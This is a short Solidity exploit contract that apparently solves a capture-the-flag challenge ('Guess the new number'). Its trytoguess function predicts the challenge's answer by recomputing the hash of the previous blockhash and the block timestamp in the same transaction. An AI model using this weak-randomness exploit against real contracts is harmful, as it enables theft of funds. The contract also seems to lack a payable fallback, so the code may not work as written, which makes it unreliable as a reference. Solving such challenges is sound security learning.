pragma solidity ^0.4.21;
import "./GuessTheNewNumberChallenge.sol";


contract Hack{
    address owner;
    GuessTheNewNumberChallenge challenge_contract;
    function Hack(address challenge_address) public{
        owner = msg.sender;
        challenge_contract = GuessTheNewNumberChallenge(challenge_address);
    }
    
    function withdraw() public{
        require(msg.sender == owner);
        address(msg.sender).transfer(address(this).balance);
    }
    
    function funds() view public returns (uint256){
        return address(this).balance;
    }
    
    function trytoguess() public payable{
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge_contract.guess.value(msg.value).gas(100000)(answer);
    }
}
